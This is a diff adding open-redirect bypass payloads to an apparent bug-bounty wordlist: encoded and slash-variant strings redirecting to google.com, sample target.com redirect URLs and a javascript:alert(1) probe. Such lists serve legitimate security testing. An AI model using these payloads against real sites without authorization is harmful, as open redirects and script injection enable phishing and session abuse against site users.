@@ -303,3 +303,19 @@ javascript:alert(1);
 ゝgoogle.com
 ーgoogle.com
 ｰgoogle.com
+# ─── open-redirect payloads (page 64 of bounty_tips_100) ───
+%09/google.com
+%5cgoogle.com
+//www.google.com/%2e%2e
+//\google.com
+/\victim.com:80%40google.com
+/\/google.com
+//;@google.com/
+//google.com/./
+///google.com
+////google.com
+# Path-based (server splits on / and takes the last one)
+https://target.com/redirect?url=//google.com
+https://target.com/redirect?url=@google.com
+https://target.com/redirect?url=google.com%2f@target.com
+https://target.com/redirect?url=javascript:alert(1)
